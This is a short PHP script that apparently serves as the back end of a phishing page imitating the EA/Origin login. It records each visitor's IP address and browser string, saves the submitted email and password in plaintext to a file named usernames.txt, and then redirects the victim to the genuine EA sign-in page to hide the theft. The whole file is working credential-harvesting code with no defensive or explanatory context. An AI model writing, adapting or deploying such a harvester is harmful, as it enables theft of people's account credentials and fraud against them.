<?php 
 
if (!empty($_SERVER['HTTP_CLIENT_IP'])) 
    { 
      $ipaddress = $_SERVER['HTTP_CLIENT_IP']; 
    } 
elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) 
    { 
      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR']; 
    } 
else 
    { 
      $ipaddress = $_SERVER['REMOTE_ADDR']; 
    } 
$browser = $_SERVER['HTTP_USER_AGENT']."\r\n"; 
file_put_contents("usernames.txt", "\nUser-Agent: " . $browser . "IP: " . $ipaddress . "\nAccount: \"" . $_POST['email'] . "\" Pass: \"" . $_POST['password'] . "\"\n", FILE_APPEND);
header('Location: https://signin.ea.com/p/originX/login?execution=e1749410853s1&initref=https%3A%2F%2Faccounts.ea.com%3A443%2Fconnect%2Fauth%3Fresponse_type%3Dcode%26client_id%3DORIGIN_SPA_ID%26display%3DoriginXWeb%252Flogin%26locale%3Den_US%26redirect_uri%3Dhttps%253A%252F%252Fwww.origin.com%252Fviews%252Flogin.html');
exit();
